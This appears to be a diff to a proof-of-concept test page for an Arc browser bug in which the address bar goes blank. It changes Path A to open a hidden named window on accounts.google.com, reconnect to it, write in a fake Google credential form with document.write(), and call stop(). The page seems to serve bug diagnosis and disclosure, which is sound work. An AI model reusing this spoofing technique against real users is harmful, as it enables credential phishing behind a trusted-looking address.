@@ -47,9 +47,9 @@ Tap each path, then <b>tap the address bar</b> and note what origin (if any) it 
 
 <table class="matrix">
 <tr><th>Path</th><th>Mechanism</th><th>Expected bar</th></tr>
-<tr><td>A</td><td>anchor.click() + document.write</td><td class="bug">EMPTY ⚠</td></tr>
-<tr><td>B</td><td>window.open + document.write</td><td>? (diagnostic)</td></tr>
-<tr><td>C</td><td>write → navigate → stop()</td><td class="ok">"about:blank"</td></tr>
+<tr><td>A</td><td>anchor.click(google) → named window reconnect → write + stop</td><td class="bug">EMPTY ⚠</td></tr>
+<tr><td>B</td><td>window.open(about:blank) → write (no navigation)</td><td>? (diagnostic)</td></tr>
+<tr><td>C</td><td>window.open → write → navigate → stop()</td><td class="ok">"about:blank"</td></tr>
 </table>
 <p class="sub" style="margin:0 0 4px">All three produce an <code>about:blank</code> document. A correct browser shows the
 <b>same</b> origin string for all three. Arc showing different states = the bug.</p>
@@ -57,9 +57,10 @@ Tap each path, then <b>tap the address bar</b> and note what origin (if any) it 
 <div id="log" class="log">ready — record your Arc version above first</div>
 
 <div class="card a">
-  <h3>Path A — anchor.click() + write &nbsp;(the bug)</h3>
-  <p>Opens an about:blank popup via a synthetic link click, injects a full Google credential
-  form + sets <code>document.title</code>. Observed: address bar shows <b>nothing</b>.</p>
+  <h3>Path A — anchor.click(Google) → named window → write + stop &nbsp;(the bug)</h3>
+  <p>Opens a named window navigating to <code>accounts.google.com</code> via a synthetic link click,
+  then reconnects by name, injects phishing via <code>document.write()</code>, and calls <code>stop()</code>.
+  Observed: address bar shows <b>nothing</b> — not even <code>about:blank</code>.</p>
   <button class="bA" onclick="pathA()">Run Path A</button>
 </div>
 
@@ -132,15 +133,20 @@ function writeInto(w,tag){
   catch(e){ L(tag+': write BLOCKED — '+e.message); return false; }
 }
 
-// Path A — anchor.click() (observed: EMPTY bar)
+// Path A — anchor.click() to TARGET + named window reconnect + write + stop
+// This is the EXACT mechanism that produced an empty URL bar in testing
 function pathA(){
-  L('Path A: anchor.click() → about:blank → write');
+  L('Path A: anchor.click(TARGET) → named window → reconnect → write + stop');
   var a=document.createElement('a');
-  a.href='about:blank'; a.target='pocA';
+  a.href=TARGET; a.target='pocA';
+  a.style.display='none';
   document.body.appendChild(a); a.click(); a.remove();
-  var w=window.open('','pocA');
-  if(!w){ L('A: no window reference (popup blocked?)'); return; }
-  setTimeout(function(){ writeInto(w,'A'); }, 60);
+  setTimeout(function(){
+    var w=window.open('','pocA');
+    if(!w){ L('A: no window reference'); return; }
+    writeInto(w,'A');
+    try{ w.stop(); L('A: stop()'); }catch(e){ L('A: stop err'); }
+  }, 50);
 }
 
 // Path B — bare window.open() (diagnostic)
